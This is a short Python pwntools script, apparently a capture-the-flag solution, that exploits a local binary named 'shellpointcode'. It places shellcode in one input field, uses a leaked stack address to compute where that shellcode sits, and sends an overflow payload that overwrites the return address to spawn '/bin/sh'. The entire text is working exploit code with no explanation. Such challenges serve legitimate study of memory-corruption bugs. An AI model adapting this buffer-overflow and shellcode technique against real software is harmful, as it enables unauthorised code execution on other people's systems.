#!/usr/bin/python 
from pwn import *

s = process("../shellpointcode")
with open("./shellcode", "rb") as f:
    shellcode = f.read()

s.sendlineafter("(15 bytes) Text for node 1:", shellcode)
s.sendlineafter("(15 bytes) Text for node 2:", "/bin/sh\x00")


s.recvuntil("node.next: ")
rsp = int(s.recvuntil("\n").strip("\n"), 16)
log.info("rsp: {}".format(hex(rsp)))
shellcode_addr = rsp+0x28

payload = "A"*3 + "B"*8 + p64(shellcode_addr)
s.sendlineafter("What are your initials?", payload)

with open("payload.txt", "w") as f:
    f.write(shellcode + "\n")
    f.write("/bin/sh\x00\n")
    f.write("A"*3 + "B"*8 +  p64(0x00007fffffffe470+0x28))
s.interactive()
